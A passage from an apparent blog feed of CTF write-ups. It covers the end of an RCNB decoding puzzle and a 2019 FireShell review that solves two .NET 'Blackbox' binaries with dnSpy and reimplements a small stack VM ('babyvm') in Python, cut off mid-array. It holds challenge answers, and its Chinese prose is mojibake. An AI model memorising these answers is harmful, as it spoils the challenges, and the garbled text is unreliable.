BÅ˜ÄŠÈµÆ…Å•Ä‹RÄ‡Å†ÃŸÆÆƒÅ”Æ‡ÈµÆ…rÆ‡Å…ÃÆ¦cÇ¹ÃÆ¦Ä‡ÈµÆÅ™ÆˆÈ“ÄnÆ„NÃ¾Å™Ä†ÅƒÆƒÅ”Ä‹Ã‘Æ€rÃ‡ÆÆ€Å™Æ‡Ç¹Ã¾Æ¦Ä‡Å†Æ„Æ¦cÆÆ…Å™È»Å†ÆÆ¦cÅˆÃÆ¦Ä‰Å†Æ„Æ¦cÅˆÃŸÆ¦cÅ†Æ€Æ¦cÇ¸ÃŸÅ™È»ÈµÆƒÅ™ÆˆÅˆÃŸÆ¦cÅ‡BÅ™Æ‡Ç¸Æ„Å™È»Å†Æ„Æ¦cÈµÆ€Æ¦Ä‡È’Ä‡ÆÃÇ¸bÅ”Ä‡ÅˆÃRÄŒNÆ…Å˜CÇ¹ÃÆ¦Ä‡ÅƒbÆ¦ÄˆÅˆÃÆ¦cÆÆ€Å™Æ‡Ç¸Æ„Å™È»È’Ä‰Å…BÇ¹ÃrÄÈ brÄÅ…ÃÅ”cÃ‘ÆƒRCÈµbÅ•Æ‡nÆ…rÄ‡ÅƒÆ„Å”CÆÃŸÅ™È»Å…ÃÆ¦cÅˆÃÆ¦Ä‰ÈµÆÅ™ÆˆÆÆ„Å™È»Å‡bÅ™Æ‡ÅˆÃÆ¦Ä‰ÈµÆÅ™ÆˆÅ…ÃŸÅ™Æ‡Å‡BÅ™Æ‡Ç¸ÆÅ™È»Å†Æ„Æ¦cÆÃŸÅ™È»ÆÆ€Å™Æ‡Ç¹Ã¾Æ¦Ä‡ÈµÃÅ™ÆˆÃ‘bÅ™È»Å™ÄŒÈµÃŸÇ¸ÃRÄŠÇ¸Ã¾RÄŠÇ¹ÃrÄÈ brÄÇ¸bÅ”Ä‡Å†Ã¾RÄ‡È ÆƒÅ˜ÄŠÅƒÆ„rÄŒÅƒBRÄŠÆÆ…Å™È»Å†Æ€Æ¦cÇ¸ÆÅ™È»Å†Æ„Æ¦cÆÆ…Å™È»ÆÆ€Å™Æ‡Ç¹ÃÆ¦Ä‡ÈµÆ€Å™ÆˆNÆÆ¦ÄˆÆÆ€Å™Æ‡ÅˆÃÆ¦Ä‰ÈµÆ„Å™ÆˆÆÃ¾Å™È»Å‡bÅ™Æ‡Ç¸ÆÅ™È»Å†Æ„Æ¦cÆÆ„Å™È»Å†BÆ¦cÇ¸ÃŸÅ™È»ÈµÃ¾Å™ÆˆÈµÆ€Æ¦Ä‡È’Ä‡ÆÆ„ÈµÆ…Å”È»NÆ…RÄ‰Ç¸Æ…Å˜CÅ†brCÈ BÅ”Ä†Å…ÃŸÅ™Æ‡Å™ÄŒÈµÆÈµÆ…Å”È»Å„Ã¾rÈ»ÆÆƒrÄ‰Ç¸ÆƒÅ™È»ÈµÃÅ™ÆˆNÆÆ¦ÄˆÅ†BÆ¦cÅˆÃÆ¦Ä‰ÈµÆÅ™ÆˆÅ‡bÆ¦Ä†Å…ÃÆ¦cÇ¹Ã¾Æ¦Ä‡Å†Æ…Æ¦cÈµÆ€Æ¦Ä‡Å‡BÅ™Æ‡Ç¸Æ…Å™È»ÈµÃ¾Å™ÆˆÆÃŸÅ™È»Å†Æ€Æ¦cÇ¸Æ„Å™È»ÈµÆ„Å™ÆˆÈµÆ€Æ¦Ä‡Å†Æ€Æ¦cÇ¹ÃÆ¦Ä‡ÅƒbÆ¦ÄˆNÆÆ¦ÄˆÅ†ÆÆ¦cÇ¹ÃÆ¦Ä‡NÃ¾Æ¦ÄˆÆÃŸÅ™È»Å™ÄŒÈµÆ…nÆƒÅ”Ä†ÆÆƒrÆˆÇ¹Æ€Å•Ä‰Å‡ÃrÄŠnÆƒÅ”Ä†ÈµÆrÈ¼Å†bÅ”cÅƒÆƒrÄŒÇ¸bÅ”Ä‡Å†ÃŸRÄ‡Ã‘Æ€rÆ‡Ç¸ÃŸÅ™È»Å†Æ„Æ¦cÆ¦È¼Å‡Æ…nÃŸrÄ‡Ç¹bRÄŠÅ…brÈ»Ç¹ÃÅ•ÄŠÅˆÃÆ¦Ä‰Å™Æ‡Ã‘bÇ¸Ã¾Å•Ä‰Å„Æ…Å•ÄÆÆ€RÈ»Ã‘BRCÆBrÆˆÅƒbÅ™Ä†ÅƒÃÅ–ÄŠnÆ€Å˜Ã‡Ç¹Æ€Å•Ä‰Å‡Æ„rÄŠÆÆƒÅ”Æ‡ÈµÆ„rÈ¼ÅƒÆ€rÄŒÅ†BrCÈ Ã¾RÄ‰ÅˆÃŸÆ¦cÅ™Ä‹Ã‘Æ…RÄ†Å‡Ã¾Å–Æ‡ÅƒÃÇ¹Æ…Æ¦Ä‡È’Ä‰Å…BÈµÆrÈ¼ÅˆÃŸÅ•Ä‹È ÃŸÅ”ÄÆÃŸÅ™È»Å†ÆÆ¦cÇ¹ÃÆ¦Ä‡Å™Æ‡ÆÃ¾Ç¹ÃrÄÅ†brCnÆƒÅ”Ä†Ã‘ÆƒRCÈµbÅ•Æ‡Å†brCnÃÅ”Ä†nBÅ˜Ã‡Å‡Æ…rÄŠÅƒÆ„rÄŒÅƒBRÄŠÆÆ…Å™È»Å†Æ€Æ¦cÇ¸ÆƒÅ™È»ÈµÃŸÅ™ÆˆÆÃŸÅ™È»ÆÆ€Å™Æ‡Ç¸ÆÅ™È»Å†Æ„Æ¦cÆÃÅ™È»Å‡bÅ™Æ‡Ç¹ÃÆ¦Ä‡NÃ¾Æ¦ÄˆÆÆ„Å™È»Å†Æ€Æ¦cÇ¸ÆÅ™È»Å†Æ„Æ¦cÆÃŸÅ™È»ÆÆ€Å™Æ‡Ç¹ÃÆ¦Ä‡ÈµÃÅ™ÆˆÆÆ„Å™È»Å‡BÅ™Æ‡Ç¸Æ…Å™È»ÈµÃ¾Å™ÆˆÆÆ…Å™È»È’Ä‡ÆÆ…ÅƒÃÅ–ÄŠnBÅ˜Ã‡Å…brÈ»È BrÄÇ¸ÃRÄŠÇ¸ÃŸRÄŠÅ…ÃŸÅ”cÅƒÆÅ™Ä†Ç¹bRÄŠÈµÃŸrÈ¼ÆbÅ˜ÄŒÅ‡Ã¾rÄŠÇ¸ÃRÄŠÃ‘BRCÇ¹Æ„rÄÅ„Æ…Å•ÄÅƒÆ„Å”CÆÃŸÅ™È»Å†ÆÆ¦cÇ¹ÃÆ¦Ä‡ÈµÃÅ™ÆˆÈ“ÄŒÅƒÆ…ÆÆ…Æ¦cNÃ¾Æ¦ÄˆÅˆÃŸÆ¦cÅ†BÆ¦cÇ¹ÃŸÆ¦Ä‡Å„ÃŸÅ™Æ‡ÅˆÃŸÆ¦cÅ†Æ€Æ¦cÇ¸Æ…Å™È»Å™ÄÈ bÅ…Ã¾Æ¦cÇ¹Æ…Æ¦Ä‡ÈµÆ„Å™ÆˆÆÃÅ™È»ÆÆ€Å™Æ‡</span><br></pre></td></tr></table></figure><p>ç„¶åä¸€å±‚å±‚è§£å¯†æ‹¿åˆ°keyï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Well done! It seems that you have great programming skills.</span><br><span class="line"></span><br><span class="line">ÈÈ¼ÅƒÃŸÉŒCÈµÆƒÈ’È¼ÈµbÈ’ÆˆnbÉŒÃ‡Å„ÃŸÉŒÄˆÈ ÆƒÈ’È»ÅƒBÈ“ÆˆÈ ÆƒÈ’È¼ÈµbÈ’ÄŒÅƒBÉŒCÅˆÆ€È’ÄŠÅ‡ÃŸÉŒcÅ„Ã¾È“ÄŒÅ‡ÆÅ•Æ‡Å†ÃÈ’È»ÅƒÆ„Å•Æ‡Å…Æ…È“Æ‡ÅƒÆƒÈ’È¼È bÈ’CÅ†ÆÉŒCÅˆÆ€È’CÅ…Æ€È’Ä‰È Æ€ÉŒÄ‡Ã‘bÉŒcÅ…Æ„ÉŒÄ‰Å†Æ„È’È»Å„Æ„ÉŒÄ‰Å‡ÃÅ•Æ‡Å†ÃÈ’È»ÅƒÆ„Å•Æ‡ÅƒbÈ’ÄŒÅƒÆ„Å•Æ‡Å„BÈ’ÄŒnÆÈ“È¼Ç¸ÃŸ</span><br><span class="line"></span><br><span class="line">Å—Ä†nÆ€È’Ä‡nÃ¾Å•Æ‡nÃ¾È“Æ‡Å„Æ…ÉŒÆ‡ÆÆ„Å™ÄˆÆÃŸÅ—Æ‡È bÈ“ÄÈµbÈ’È¼ÆÃ¾Å—cÅ…Æ…È‘Ä‰È ÆÈ’CÅ…Æ€ÉŒÄ‡ÅƒÃÉŒÄ‡Ã‘ÃŸÅ•Æ‡Å…Ã¾È“ÄŒÅˆBÉŒÄŒÅ…Æ…È“ÄŠÇ¸Æ„ÉŒcÅ„Æ„Å•Æ‡Å„Ã¾È’Ä†ÈµÃ¾ÉŒÄ‰Å‡ÃÅ•Æ‡ÅƒÆƒÅ™ÄÈ bÅ™Ä‹ÈµÆ€È“CÃ‘BÅ™Ä‡ÅƒBÅ–ÄŒÈµÆƒÉŒÄ‡Ç¸Æ€È“ÆˆÈ ÃŸÅ˜ÄÅ…Æ„Å—Ä‰È Æ„È’È¼ÈµÆ…È’È»Å…BÈ’Ä†ÆÆƒÈ’ÄˆÃ‘Æ„È“ÄŠÅ†BÅ™Æ‡NÆÉŒÆ‡ÆbÉŒCÆÃŸÈÄ‰Å†Ã¾Æ¦È»ÆÆƒÅ—ÄˆÅ„Æ€ÉŒCÆB</span><br><span class="line"></span><br><span class="line">;) ÈcÅˆÃÅ—cÅ…Æ…È’CÅ…Æ€È’Ä‰È Æ€È’È»ÅƒÆ„ÉŒcÅ„Æ„Å–Ä‹Å…Ã¾Å•Æ‡Å†ÃÈ’È»ÅƒÆ„Å•Æ‡Å…Ã¾È’ÄŒÅƒÃŸÅ˜ÄÅ„bÆ¦È»Å‡Æ…ÉŒÄŒÃ‘Ã¾ÉŒÆˆÇ¹ÆƒÉŒÄ‰Å…ÃŸÈ’CÅ…Æ…È’ÄŒnBÆ¦È»ÆÆƒÈ‘Ã‡ÆÆ„Å˜CNÆÈÄ‰Å†Ã¾</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Well done! It seems that you have great programming skills.</span><br><span class="line"></span><br><span class="line">Wishing you happiness during the holidays and throughout the New Year!</span><br><span class="line"></span><br><span class="line">- by Coxxs@52PoJiE, [Want to know more about RCNB.js?](https://github.com/Coxxs/RCNB.js)</span><br><span class="line"></span><br><span class="line">;) Oh, and here&apos;s the key: N0w_y0u_are_NB_A5_RC</span><br></pre></td></tr></table></figure><h1 id="æ„Ÿè°¢çš„è¯"><a href="#æ„Ÿè°¢çš„è¯" class="headerlink" title="æ„Ÿè°¢çš„è¯"></a>æ„Ÿè°¢çš„è¯</h1><p>æœ€åæ„Ÿè°¢å¾çˆ±ç ´è§£å¤§ä½¬ä»¬çš„è¾›å‹¤ä»˜å‡ºï¼</p><h1 id="å‚è€ƒç½‘ç«™"><a href="#å‚è€ƒç½‘ç«™" class="headerlink" title="å‚è€ƒç½‘ç«™"></a>å‚è€ƒç½‘ç«™</h1><p><a href="https://github.com/Coxxs/RCNB.js" target="_blank" rel="noopener">https://github.com/Coxxs/RCNB.js</a><br><a href="https://travis-ci.com/Coxxs/RCNB.js" target="_blank" rel="noopener">https://travis-ci.com/Coxxs/RCNB.js</a><br><a href="https://liudanking.com/golang/utf-8_replacement_character/" target="_blank" rel="noopener">https://liudanking.com/golang/utf-8_replacement_character/</a><br><a href="https://www.52pojie.cn/thread-873265-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-873265-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åšäº†ç‚¹ç®€å•çš„é¢˜ç›®ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="https://qianfei11.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>2019-FireShell-review</title>
    <link href="https://qianfei11.github.io/2019/01/30/%E3%80%90%E6%9C%AA%E5%AE%8C%E6%88%90%E3%80%912019-FireShell-review/"/>
    <id>https://qianfei11.github.io/2019/01/30/ã€æœªå®Œæˆã€‘2019-FireShell-review/</id>
    <published>2019-01-30T04:51:13.000Z</published>
    <updated>2019-02-01T12:08:18.439Z</updated>
    
    <content type="html"><![CDATA[<p>æ¯”èµ›æ²¡æ‰“ï¼Œå½“ä½œç»ƒä¹ ä»¥åŠçœ‹ç€å¤§ä½¬çš„writeupå¤ç°äº†ä¸€ä¸‹å‡ é“äºŒè¿›åˆ¶ã€‚</p><a id="more"></a><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Blackbox-0"><a href="#Blackbox-0" class="headerlink" title="Blackbox-0"></a>Blackbox-0</h2><p>å…ˆfileä¸€ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> file Blackbox-0.exe </span><br><span class="line">Blackbox-0.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows</span><br></pre></td></tr></table></figure><p>è¿è¡Œç¨‹åºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This binary is a black box.</span><br><span class="line">This means that it was designed to be analyzed without looking it&apos;s inside contents</span><br><span class="line">You will solve the chalenge by letting the flag to be outputted in some way.</span><br><span class="line">You will need to figure out what this binary is doing by just examining it&apos;s behaviour in the environment.</span><br></pre></td></tr></table></figure><p>æ˜¯<code>.NET</code>ç¨‹åºï¼Œæ•…ä½¿ç”¨<a href="https://github.com/0xd4d/dnSpy" target="_blank" rel="noopener">dnSpy</a>æ¥è°ƒè¯•ã€‚åœ¨å•æ­¥æ—¶ï¼Œå‘ç°<code>\u000F\u2009</code>ç¬¬354è¡Œè¿”å›ä¸€ä¸ªå˜é‡<code>text</code>ã€‚</p><p><img src="/pics/2019-FireShell-review/RE/Blackbox-0/1.png" alt="å¯ç–‘ä»£ç æ®µ"></p><p>åœ¨è¿™é‡Œè®¾ä¸‹æ–­ç‚¹ï¼Œå¹¶å¤šæ¬¡ç»§ç»­åä¼šå¾—åˆ°ä¸€ä¸²base64ï¼Œè§£å¯†å¾—åˆ°flagï¼š</p><p><img src="/pics/2019-FireShell-review/RE/Blackbox-0/2.png" alt="textå€¼ä¸ºbase64ä¸²"></p><h2 id="Blackbox-1"><a href="#Blackbox-1" class="headerlink" title="Blackbox-1"></a>Blackbox-1</h2><p>fileä¸€ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> file Blackbox-1.exe </span><br><span class="line">Blackbox-1.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows</span><br></pre></td></tr></table></figure><p>è¿è¡Œç¨‹åºæ²¡æœ‰ä»»ä½•è¾“å‡ºã€‚åŒæ ·å› ä¸ºæ˜¯<code>.NET</code>ç¨‹åºï¼Œä½¿ç”¨dnSpyè°ƒè¯•ã€‚åœ¨<code>\u000F\u2009</code>ç¬¬358è¡Œè¿”å›ä¸€ä¸ªå˜é‡<code>text</code>ï¼š</p><p><img src="/pics/2019-FireShell-review/RE/Blackbox-1/1.png" alt="å¯ç–‘ä»£ç æ®µ"></p><p>åœ¨æ­¤å¤„è®¾ç½®æ–­ç‚¹å¹¶å¤šæ¬¡ç»§ç»­ï¼Œ<code>text</code>çš„å€¼ä¼šå˜æˆflagï¼š</p><p><img src="/pics/2019-FireShell-review/RE/Blackbox-1/2.png" alt="å¾—åˆ°flag"></p><h2 id="babyvm"><a href="#babyvm" class="headerlink" title="babyvm"></a>babyvm</h2><p>ä¸€é“ç®€å•è™šæ‹Ÿæœºã€‚è¿è¡Œä¸€ä¸‹å‡ºç°<code>Program executed successfully!</code>ã€‚å…ˆæ‹–è¿›idaæŸ¥çœ‹mainå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">while</span> ( (_BYTE)end_sign )</span><br><span class="line">  &#123;</span><br><span class="line">    get_option();</span><br><span class="line">    vm_start();</span><br><span class="line">    ++j;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‡½æ•°è·å–ä¸€ä¸ªoptionï¼Œç„¶åè¿›å…¥<code>vm_start()</code>æ‰§è¡ŒæŒ‡ä»¤ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vm_start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *__ptr32 *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST34_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST3C_4</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST28_4</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ST30_4</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ST24_4</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// ST18_4</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+40h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v0 = off_33D0;</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">      ++i;</span><br><span class="line">      ++j;</span><br><span class="line">      v0 = (<span class="keyword">void</span> *__ptr32 *)buf;</span><br><span class="line">      buf[i] = code[j];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">      v1 = i--;</span><br><span class="line">      v2 = buf[v1];</span><br><span class="line">      v3 = i--;</span><br><span class="line">      v4 = buf[v3] + v2;</span><br><span class="line">      ++i;</span><br><span class="line">      v0 = (<span class="keyword">void</span> *__ptr32 *)buf;</span><br><span class="line">      buf[i] = v4;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">      LOBYTE(end_sign) = <span class="number">0</span>;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Program executed successfully!"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      v5 = i--;</span><br><span class="line">      v6 = buf[v5];</span><br><span class="line">      v7 = i--;</span><br><span class="line">      v8 = v6 * buf[v7];</span><br><span class="line">      ++i;</span><br><span class="line">      v0 = (<span class="keyword">void</span> *__ptr32 *)buf;</span><br><span class="line">      buf[i] = v8;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">      v9 = i--;</span><br><span class="line">      v10 = buf[v9];</span><br><span class="line">      v11 = i--;</span><br><span class="line">      v12 = buf[v11] / v10;</span><br><span class="line">      ++i;</span><br><span class="line">      v0 = (<span class="keyword">void</span> *__ptr32 *)buf;</span><br><span class="line">      buf[i] = v12;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">      v13 = i--;</span><br><span class="line">      v14 = buf[v13];</span><br><span class="line">      v15 = i--;</span><br><span class="line">      v16 = buf[v15] - v14;</span><br><span class="line">      ++i;</span><br><span class="line">      v0 = (<span class="keyword">void</span> *__ptr32 *)buf;</span><br><span class="line">      buf[i] = v16;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ç¨‹åºæ‰§è¡Œäº†å†…éƒ¨çš„æŒ‡ä»¤ï¼Œæ²¡æœ‰ä»»ä½•ä¸æŒ‡ä»¤æœ‰å…³çš„è¾“å‡ºã€‚åªç®¡æŠŠæŒ‡ä»¤dumpå‡ºæ¥ï¼Œå†æŠŠswitchå†™å‡ºæ¥å¤ç°ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="number">0x00000000</span>, <span class="number">0x00000046</span>, <span class="number">0x00000000</span>, <span class="number">0x00000061</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000000A7</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000343</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000016D5</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005C</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x000016D5</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CD7D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CD7D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000048</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CD7D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000059</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CD7D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000038</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CD7D</span>, <span class="number">0x00000000</span>, <span class="number">0x00000024</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CDA1</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CD5B</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CDA1</span>, <span class="number">0x00000000</span>, <span class="number">0x0000CDA1</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000023</span>, <span class="number">0x00000000</span>, <span class="number">0x00000038</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000023</span>, <span class="number">0x00000000</span>, <span class="number">0x00000039</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000023</span>, <span class="number">0x00000000</span>, <span class="number">0x00000043</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000023</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x000000F5</span>, <span class="number">0x00000000</span>, <span class="number">0x00000054</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000149</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x0000066D</span>, <span class="number">0x00000000</span>, <span class="number">0x0000003E</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x000006AB</span>, <span class="number">0x00000000</span>, <span class="number">0x0000005A</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000705</span>, <span class="number">0x00000000</span>, <span class="number">0x00000026</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000705</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000E0A</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000E0A</span>, <span class="number">0x00000000</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00008C64</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00034A58</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00170868</span>, <span class="number">0x00000000</span>, <span class="number">0x00000032</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00170868</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00170868</span>, <span class="number">0x00000000</span>, <span class="number">0x00000020</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00170868</span>, <span class="number">0x00000000</span>, <span class="number">0x00000010</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00170868</span>, <span class="number">0x00000000</span>, <span 